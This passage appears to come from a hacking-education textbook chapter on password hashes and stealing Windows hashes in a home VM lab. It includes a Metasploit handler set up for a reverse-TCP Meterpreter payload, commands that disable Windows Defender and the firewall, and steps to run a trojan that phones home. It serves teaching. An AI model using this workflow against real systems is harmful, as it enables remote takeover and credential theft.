- raw: "In Chapter 6, you learned how an attacker can create malware to infect your\
    \ computer and see your files, keystrokes, screen, webcam video, and more. In\
    \ this chapter, you’ll see how an attacker can use that same malware to steal\
    \ the encrypted passwords of all users on a Windows computer. Then you’ll find\
    \ out how hackers *crack* those passwords, or recover them in their unencrypted,\
    \ plaintext form.\n\nIf an attacker cracks your password, they may be able to\
    \ hack into any other account, website, or device where you’ve used that password—even\
    \ if you’ve added extra characters to make it “unique” for those other accounts.\
    \ Weak passwords are one of the easiest ways for black hat hackers to break into\
    \ an organization’s network or into your personal accounts. If your password is\
    \ strong enough, however, even if an attacker steals the encrypted password, they\
    \ won’t be able to crack it.\n\n## Password Hashes\n\nModern computer systems\
    \ and secure websites encrypt passwords with a cryptographic hash function before\
    \ storing them. Unlike the codes you encounter in spy movies, which are meant\
    \ to be decoded on the receiving end, a *cryptographic hash function* encrypts\
    \ your password in a way that cannot be reversed or decrypted. The hashed version\
    \ of the password is known as a *password hash*. Hashes can be viewed as long\
    \ strings of hexadecimal digits, as in [Listing 7-1](#c07.xhtml#listing7-1).\n\
    \n```\n359878442cf617606802105e2f439dbc\n63191e4ece37523c9fe6bb62a5e64d45\n9dddd5ce1b1375bc497feeb871842d4b\n\
    4d1f35512954cb227b25bbd92e15bc7b\ne6071c75ea19bef227b49e5e304eb2f1\n```\n\nListing\
    \ 7-1: Hashed versions of five passwords\n\nWhen you log in to a computer or website,\
    \ the only way for it to check whether you entered the correct password is to\
    \ run the same hash function on the characters you entered and then compare the\
    \ result with the password hash stored in its database.\n\nThere are lots of different\
    \ types of hash functions, but they have several things in common:\n\n*   The\
    \ same input text will always produce the same hash value in a particular hash\
    \ function; this is necessary so that your stored password hash can be tested\
    \ against the hash of the password you enter when you return to a site.\n\n* \
    \  Every hash from a particular hash function will be the same length, no matter\
    \ how long the input text might be. Since a one-word password and a five-word\
    \ password will produce the same number of hash characters, the hash function\
    \ hides the length of your password.\n\n*   Changing just one character in the\
    \ input will cause lots of characters in the hash to change, so adding even a\
    \ single character to a password changes the hash completely.\n\n## Stealing Windows\
    \ Password Hashes\n\nIn this section, we’ll use your Kali Linux VM to steal password\
    \ data from your Windows 10 VM. First, we’ll create several usernames and passwords\
    \ in the Windows 10 VM. Next, we’ll use the Meterpreter remote access trojan to\
    \ break back into the Windows VM. Then, we’ll use the Mimikatz tool in Metasploit\
    \ to steal the password hashes from the Windows 10 victim machine.\n\n### Creating\
    \ Windows Users\n\nFirst, let’s add some users to the Windows 10 VM so we can\
    \ later steal their password hashes.\n\n1.  Open your Windows 10 VM in VirtualBox\
    \ (logging in with `IEUser` and `Passw0rd!`).\n\n2.  Enter `cmd` into the Windows\
    \ search bar, right-click the **Command Prompt** app, and click **Run as administrator**.\
    \ Click **Yes** when Windows asks if you want to allow this app to make changes\
    \ to your device.\n\n3.  Create a new user account with the same command we used\
    \ during the Sticky Keys hack back in Chapter 2:\n\n    ```\n    C:\\WINDOWS\\\
    system32> net user ironman Jarvis /add\n    ```\n\n    This command adds a user\
    \ called *ironman* with the password *Jarvis*.\n\n4.  Now add several more user\
    \ accounts with passwords of different complexity and length:\n\n    ```\n   \
    \ C:\\WINDOWS\\system32> net user ana Password1 /add\n    C:\\WINDOWS\\system32>\
    \ net user ben P@$$w0rd! /add\n    C:\\WINDOWS\\system32> net user carol CaptainMarvel\
    \ /add\n    C:\\WINDOWS\\system32> net user clark superman20 /add\n    C:\\WINDOWS\\\
    system32> net user kara SuperGirl7! /add\n    C:\\WINDOWS\\system32> net user\
    \ peter SpidermanRulez:) /add\n    ```\n\n5.  After the last command, Windows\
    \ will warn you that the password is longer than 14 characters (which was the\
    \ limit for password length on Windows machines before the year 2000!). Enter\
    \ `Y` to let Windows know you still want to use the long password.\n\n6.  Finally,\
    \ create a hard passphrase (made up of at least four words, plus a number or special\
    \ symbol) for a username with your name—but make sure it’s a fake passphrase that\
    \ you’re not using on any real accounts, since we’ll be trying to crack it. Here’s\
    \ mine:\n\n    ```\n    C:\\WINDOWS\\system32> net user bryson Don'tyouwishyourpasswordwastoughlikemine!\
    \ /add\n    ```\n\nYou may think a passphrase like this is too hard to type every\
    \ time you log in, but it’s actually easier to remember and harder to guess than\
    \ most of the passwords you’ve added.\n\n### Hacking Back into Windows 10 with\
    \ Meterpreter\n\nNext we need to hack back into the Windows 10 VM from Kali.\n\
    \n1.  Start your Kali VM (logging in with username and password `kali`) and open\
    \ the Metasploit app by clicking the Kali menu button and selecting **08 - Exploitation\
    \ Tools**▶**Metasploit Framework**.\n\n2.  At the `msf6` command prompt, enter\
    \ the following command to start your Kali web server again:\n\n    ```\n    msf6\
    \ > sudo service apache2 start\n    ```\n\n    The web server will serve the *10.0.9.x/share*\
    \ folder containing your Windows malware in case you need to download it again.\n\
    \n3.  Enter the following four commands in Metasploit to listen for the Meterpreter\
    \ trojan to phone home:\n\n    ```\n    msf6 > use exploit/multi/handler\n   \
    \ msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp\n\
    \    msf6 exploit(multi/handler) > set LHOST 10.0.9.x\n    msf6 exploit(multi/handler)\
    \ > exploit -j\n    ```\n\n    Remember to change `10.0.9.x` to your Kali VM’s\
    \ IP address (enter `ip` `addr`, or `ip` `a` for short, to see the IP address).\n\
    \n4.  Switch back to your Windows 10 VM. Turn off your Windows Defender real-time\
    \ virus protection: enter `virus` into the Windows search bar, open **Virus &\
    \ threat protection settings**, click **Manage settings**, and slide the toggle\
    \ under Real-time protection to **Off**.\n\n5.  Enter the following command into\
    \ an administrator command prompt in the Windows 10 VM to disable the Windows\
    \ Firewall as well:\n\n    ```\n    C:\\Windows\\system32> netsh advfirewall set\
    \ allprofiles state off\n    ```\n\n    Windows will respond with `Ok.`.\n\n6.\
    \  Find the Meterpreter trojan executable file you created in Chapter 6. This\
    \ file should still be in your *Downloads* or *Documents* folder. If Windows Defender\
    \ has removed it, open the Edge browser, go to *http://<10.0.9.4>/share/* (substitute\
    \ your Kali VM’s IP address if it’s different from *10.0.9.4*), and download the\
    \ trojan again. Check your Virus & threat protection settings again to make sure\
    \ real-time protection is turned off. Then double-click the trojan to run it.\n\
    \n7.  Switch back to your Kali VM, and you should see a Meterpreter session opened:\n\
    \n    ```\n    msf6 exploit(multi/handler) > [*] Sending stage (179779 bytes)\
    \ to 10.0.9.5[*] Meterpreter session 1 opened (10.0.9.4:4444 -> 10.0.9.5:50789)\
    \ at 2020-06-17 15:40:38 -0400\n    ```\n\n### Escalating Privileges\n\nStealing\
    \ Windows passwords requires administrator- or system-level privileges, a higher\
    \ level of access than the IEUser account that you used to run the Meterpreter\
    \ trojan. Thanks to Metasploit, we’ll be able to raise our access level with another\
    \ exploit. This process is known as *privilege escalation*."
